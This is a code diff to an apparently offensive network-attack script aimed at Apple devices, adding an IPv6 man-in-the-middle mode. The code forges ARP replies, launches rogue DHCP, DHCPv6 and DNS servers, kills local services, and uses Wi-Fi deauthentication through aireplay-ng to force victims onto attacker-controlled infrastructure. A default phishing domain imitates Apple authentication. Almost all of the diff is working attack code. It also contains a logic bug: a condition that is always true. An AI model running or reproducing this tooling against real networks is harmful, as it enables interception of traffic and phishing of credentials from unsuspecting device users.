@@ -8,14 +8,14 @@ utils_path = project_root_path + "/Utils/"
 scripts_arp_path = project_root_path + "/Scripts/ARP"
 
 path.append(utils_path)
-path.append(scripts_arp_path)
-
 from base import Base
 from scanner import Scanner
 from tm import ThreadManager
-from network import Ethernet_raw, IP_raw, UDP_raw, DHCP_raw
-from socket import socket, AF_PACKET, SOCK_RAW, htons
+from network import Sniff_raw, ARP_raw
+
+path.append(scripts_arp_path)
 from arp_scan import ArpScan
+
 from os import path, errno, makedirs, stat
 from shutil import copyfile, copytree
 import subprocess as sub
@@ -23,6 +23,7 @@ from argparse import ArgumentParser
 from sys import exit, stdout
 from time import sleep
 from ipaddress import IPv4Address
+from socket import socket, AF_PACKET, SOCK_RAW
 import re
 # endregion
 
@@ -43,12 +44,26 @@ parser.add_argument('-D', '--phishing_domain', type=str, default="auth.apple.wi-
                     help='Set domain name for social engineering (default="auth.apple.wi-fi.com")')
 parser.add_argument('-p', '--phishing_domain_path', type=str, default="apple",
                     help='Set local path to domain name for social engineering (default="apple")')
-parser.add_argument('-k', '--kill', action='store_true', help='Kill all subprocesses')
+
 parser.add_argument('-t', '--target_ip', type=str, help='Set target IP address', default=None)
 parser.add_argument('-n', '--new_ip', type=str, help='Set new IP address for target', default=None)
 parser.add_argument('-s', '--nmap_scan', action='store_true', help='Use nmap for Apple device detection')
-parser.add_argument('--deauth', action='store_true', help='Use wifi deauth technique for disconnect Apple device')
+
+parser.add_argument('--kill', action='store_true', help='Kill all processes and threads')
+parser.add_argument('--deauth', action='store_true', help='Use WiFi deauth technique for disconnect Apple device')
+
+parser.add_argument('--ipv6', action='store_true', help='Use IPv6 MiTM')
+parser.add_argument('--ipv6_prefix', type=str, help='Set network prefix', default='fd00::/64')
+
 args = parser.parse_args()
+# endregion
+
+# region Check parameters --ipv6 and --deauth
+if args.ipv6:
+    if args.deauth_iface is None:
+        if not args.deauth:
+            Base.print_error("IPv6 MiTM technique works only with WiFi deauth technique: `--deauth`")
+            exit(1)
 # endregion
 
 # region Kill subprocesses
@@ -71,9 +86,10 @@ except OSError as e:
         Base.print_error("Something went wrong while trying to run ", "`service ...`")
         exit(2)
 
-# Kill the processes that listens on 53 UDP port, 80 and 443 TCP ports
+# Kill the processes that listens on 53, 68, 547 UDP port, 80 and 443 TCP ports
 Base.kill_process_by_listen_port(53, 'udp')
 Base.kill_process_by_listen_port(68, 'udp')
+Base.kill_process_by_listen_port(547, 'udp')
 Base.kill_process_by_listen_port(80, 'tcp')
 Base.kill_process_by_listen_port(443, 'tcp')
 
@@ -84,6 +100,9 @@ if args.kill:
 # endregion
 
 # region Set global variables
+raw_socket = None
+arp = ARP_raw()
+
 deauth_network_interface = None
 
 apple_devices = []
@@ -99,6 +118,13 @@ channel = None
 freq = None
 
 sniff_dhcp_request = False
+
+your_local_ipv6_address = None
+network_prefix = None
+network_prefix_address = None
+network_prefix_length = None
+first_suffix = 2
+last_suffix = 255
 # endregion
 
 # region Get listen network interface, your IP address, first and last IP in local network
@@ -106,10 +132,25 @@ if args.listen_iface is None:
     Base.print_warning("Please set a network interface for sniffing ARP and DHCP requests ...")
 listen_network_interface = Base.netiface_selection(args.listen_iface)
 
+your_mac_address = Base.get_netiface_mac_address(listen_network_interface)
+if your_mac_address is None:
+    Base.print_error("Network interface: ", listen_network_interface, " does not have MAC address!")
+    exit(1)
+
 your_ip_address = Base.get_netiface_ip_address(listen_network_interface)
 if your_ip_address is None:
     Base.print_error("Network interface: ", listen_network_interface, " does not have IP address!")
     exit(1)
+
+if args.ipv6:
+    your_local_ipv6_address = Base.get_netiface_ipv6_link_address(listen_network_interface)
+    if your_local_ipv6_address is None:
+        print Base.c_error + "Network interface: " + listen_network_interface + " do not have IPv6 link local address!"
+        exit(1)
+
+    network_prefix = args.ipv6_prefix
+    network_prefix_address = network_prefix.split('/')[0]
+    network_prefix_length = network_prefix.split('/')[1]
 
 first_ip = Base.get_netiface_first_ip(listen_network_interface)
 last_ip = Base.get_netiface_last_ip(listen_network_interface)
@@ -163,9 +204,18 @@ if args.deauth:
 
 # region General output
 Base.print_info("Listen network interface: ", listen_network_interface)
-Base.print_info("Your IP address: ", your_ip_address)
-Base.print_info("First ip address: ", first_ip)
-Base.print_info("Last ip address: ", last_ip)
+
+if not args.ipv6:
+    Base.print_info("Your IP address: ", your_ip_address)
+    Base.print_info("First ip address: ", first_ip)
+    Base.print_info("Last ip address: ", last_ip)
+else:
+    Base.print_info("Your IPv6 local address: ", your_local_ipv6_address)
+    Base.print_info("Prefix: ", network_prefix)
+    Base.print_info("Router IPv6 address: ", your_local_ipv6_address)
+    Base.print_info("DNS IPv6 address: ", your_local_ipv6_address)
+    Base.print_info("First advertise IPv6 address: ", network_prefix_address + hex(first_suffix))
+    Base.print_info("Last advertise IPv6 address: ", network_prefix_address + hex(last_suffix))
 
 if args.deauth:
     Base.print_info("Interface ", listen_network_interface, " connect to: ", essid + " (" + bssid + ")")
@@ -203,108 +253,58 @@ if args.new_ip is not None:
 
 # region DHCP Request sniffer PRN function
 def dhcp_request_sniffer_prn(request):
-    # Global variables
+    
+    # region Global variables
     global sniff_dhcp_request
     global Base
+    global args
+    global arp
+    global raw_socket
+    # endregion
 
-    # This request is DHCP
-    if 'DHCP' in request.keys():
+    # region Local variables
+    requested_ipv4_address = None
+    # endregion
 
-        # Kill aireply-ng
-        sleep(2)
+    # region Stop aireplay-ng
+    if 'ARP' or 'DHCP' in request.keys():
         sniff_dhcp_request = True
         Base.kill_process_by_name('aireplay-ng')
+    # endregion
+
+    # region IPv6
+    if args.ipv6:
+        if 'ARP' in request.keys():
+            if request['ARP']['opcode'] == 1:
+                if request['Ethernet']['destination'] == "ff:ff:ff:ff:ff:ff":
+                    if request['ARP']['sender-ip'] == request['ARP']['target-ip']:
+                        arp_reply = arp.make_response(ethernet_src_mac=your_mac_address,
+                                                      ethernet_dst_mac=request['ARP']['sender-mac'],
+                                                      sender_mac=your_mac_address,
+                                                      sender_ip=request['ARP']['target-ip'],
+                                                      target_mac=request['ARP']['sender-mac'],
+                                                      target_ip=request['ARP']['sender-ip'])
+                        raw_socket.send(arp_reply)
+    # endregion
 
 # endregion
 
 
-# region DHCP Request sniffer function
+# region DHCP or DHCPv6 Request sniffer function
 def dhcp_request_sniffer():
-
-    # region Sniff network
-
-    # region Create RAW socket for sniffing
-    rawSocket = socket(AF_PACKET, SOCK_RAW, htons(0x0003))
+    # region Set network filter
+    network_filters = {'Ethernet': {'source': target_mac_address}}
     # endregion
 
-    # region Local variables
-    eth = Ethernet_raw()
-    ip = IP_raw()
-    udp = UDP_raw()
-    dhcp = DHCP_raw()
+    # region Start sniffer
+    sniff = Sniff_raw()
 
-    ethernet_header_length = 14
-    udp_header_length = 8
-    # endregion
+    global raw_socket
+    raw_socket = socket(AF_PACKET, SOCK_RAW)
+    raw_socket.bind((listen_network_interface, 0))
 
-    # region Start sniffing
-    while True:
-
-        # region Get packets from RAW socket
-        packets = rawSocket.recvfrom(2048)
-
-        for packet in packets:
-
-            # region Get Ethernet header from packet
-            ethernet_header = packet[0:ethernet_header_length]
-            ethernet_header_dict = eth.parse_header(ethernet_header)
-            # endregion
-
-            # region Success parse Ethernet header
-            if ethernet_header_dict is not None:
-
-                # region DHCP packet
-
-                # 2048 - Type of IP packet (0x0800)
-                if ethernet_header_dict['type'] == 2048:
-
-                    # Get IP header
-                    ip_header = packet[ethernet_header_length:]
-                    ip_header_dict = ip.parse_header(ip_header)
-
-                    # Success parse IP header
-                    if ip_header_dict is not None:
-
-                        # UDP
-                        if ip_header_dict['protocol'] == 17:
-
-                            # Get UDP header offset
-                            udp_header_offset = ethernet_header_length + (ip_header_dict['length'] * 4)
-
-                            # Get UDP header
-                            udp_header = packet[udp_header_offset:udp_header_offset + udp_header_length]
-                            udp_header_dict = udp.parse_header(udp_header)
-
-                            # Success parse UDP header
-                            if udp_header is not None:
-                                if udp_header_dict['source-port'] == 68 and udp_header_dict['destination-port'] == 67:
-
-                                    # Get DHCP header offset
-                                    dhcp_packet_offset = udp_header_offset + udp_header_length
-
-                                    # Get DHCP packet
-                                    dhcp_packet = packet[dhcp_packet_offset:]
-                                    dhcp_packet_dict = dhcp.parse_packet(dhcp_packet)
-
-                                    # Create full request
-                                    request = {
-                                        "Ethernet": ethernet_header_dict,
-                                        "IP": ip_header_dict,
-                                        "UDP": udp_header_dict
-                                    }
-                                    request.update(dhcp_packet_dict)
-
-                                    # Reply to this request
-                                    dhcp_request_sniffer_prn(request)
-
-                # endregion
-
-            # endregion
-
-        # endregion
-
-    # endregion
-
+    sniff.start(protocols=['IP', 'ARP', 'UDP', 'DHCP'],
+                prn=dhcp_request_sniffer_prn, filters=network_filters)
     # endregion
 
 # endregion
@@ -512,8 +512,16 @@ if __name__ == "__main__":
     # region DNS server settings
     Base.print_info("Start DNS server ...")
     try:
-        sub.Popen(['python ' + script_dir + '/Scripts/DNS/dns_server.py -i ' + listen_network_interface + ' -f -q'],
-                  shell=True)
+        # Use IPv6
+        if args.ipv6:
+            sub.Popen(['python ' + script_dir + '/Scripts/DNS/dns_server.py -i ' +
+                       listen_network_interface + ' --ipv6 -f -q'], shell=True)
+
+        # Do not use IPv6
+        else:
+            sub.Popen(['python ' + script_dir + '/Scripts/DNS/dns_server.py -i ' +
+                       listen_network_interface + ' -f -q'], shell=True)
+
     except OSError as e:
         if e.errno == errno.ENOENT:
             Base.print_error("Program: ", "python", " is not installed!")
@@ -589,17 +597,24 @@ if __name__ == "__main__":
             Base.print_info("Target new ip: ", new_ip)
         # endregion
 
-        # region Run apple_rogue_dhcp and network_conflict_creator scripts
+        # region IPv4 address conflict technique
         if not args.deauth:
             try:
+                # Start DHCP rogue server for Apple device
                 sub.Popen(['python ' + script_dir + '/Scripts/Apple/apple_rogue_dhcp.py -i ' +
                            listen_network_interface + ' -t ' + target_mac_address +
                            ' -I ' + new_ip + ' -q &'],
                           shell=True)
+
+                # Wait 3 seconds
                 sleep(3)
+
+                # Start network_conflict_creator.py script
                 sub.Popen(['python ' + script_dir + '/Scripts/Others/network_conflict_creator.py -i ' +
                            listen_network_interface + ' -I ' + target_ip_address +
                            ' -t ' + target_mac_address + ' -q'], shell=True)
+
+            # Exceptions
             except OSError as e:
                 if e.errno == errno.ENOENT:
                     Base.print_error("Program: ", "python", " is not installed!")
@@ -610,15 +625,28 @@ if __name__ == "__main__":
                     exit(2)
         # endregion
 
-        # region Run dhcp_rogue_server script and aireply-ng for send deauth packets to Target
+        # region Wifi deauth technique
         if args.deauth:
             try:
-                # Start dhcp_rogue_server.py script as process
-                sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
-                           listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
-                           ' --dnsop --exit --quiet &'],
-                          shell=True)
+                if args.ipv6:
+                    # Start DHCPv6 rogue server
+                    sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcpv6_rogue_server.py -i ' +
+                               listen_network_interface + ' -t ' + target_mac_address +
+                               ' -p ' + network_prefix + ' -f ' + str(first_suffix) +
+                               ' -l ' + str(last_suffix) + ' -q &'],
+                              shell=True)
+
+                else:
+                    # Start DHCP rogue server
+                    sub.Popen(['python ' + script_dir + '/Scripts/DHCP/dhcp_rogue_server.py -i ' +
+                               listen_network_interface + ' -t ' + target_mac_address + ' -T ' + target_ip_address +
+                               ' --dnsop --exit --quiet &'],
+                              shell=True)
+
+                # Wait 3 seconds
                 sleep(3)
+
+            # Exceptions
             except OSError as e:
                 if e.errno == errno.ENOENT:
                     Base.print_error("Program: ", "python", " is not installed!")
